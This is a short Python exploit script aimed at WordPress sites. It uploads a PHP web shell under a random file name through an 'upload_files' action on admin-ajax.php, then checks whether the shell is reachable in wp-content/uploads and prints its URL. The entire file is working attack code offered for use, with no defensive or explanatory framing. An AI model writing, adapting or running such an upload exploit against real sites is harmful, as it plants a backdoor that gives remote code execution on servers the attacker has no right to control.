import requests
import random
import string
import os

def random_shell_name(ext="php"):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + f".{ext}"

def exploit(site_url, payload_path='payloads/simple_shell.php'):
    print(f"[*] Targeting WP-Ajax Upload at: {site_url}")
    try:
        upload_url = f"{site_url}/wp-admin/admin-ajax.php?action=upload_files"
        shell_name = random_shell_name()
        full_payload_path = os.path.abspath(payload_path)

        if not os.path.exists(full_payload_path):
            print(f"[x] Payload not found at: {full_payload_path}")
            return False, None

        files = {
            'files[]': (shell_name, open(full_payload_path, 'rb'), 'application/x-php')
        }

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Referer": site_url
        }

        print(f"[>] Uploading: {shell_name}")
        r = requests.post(upload_url, files=files, headers=headers, timeout=10)

        if r.status_code == 200:
            shell_url = f"{site_url}/wp-content/uploads/{shell_name}"
            check = requests.get(shell_url, headers=headers, timeout=10)

            if check.status_code == 200:
                print(f"[âœ”] Shell uploaded successfully! Access it at: {shell_url}")
                return True, shell_url
            else:
                print(f"[x] Upload POST succeeded but shell not accessible: HTTP {check.status_code}")
        else:
            print(f"[x] Upload failed: HTTP {r.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")

    print("[-] WP-Ajax Upload failed.")
    return False, None
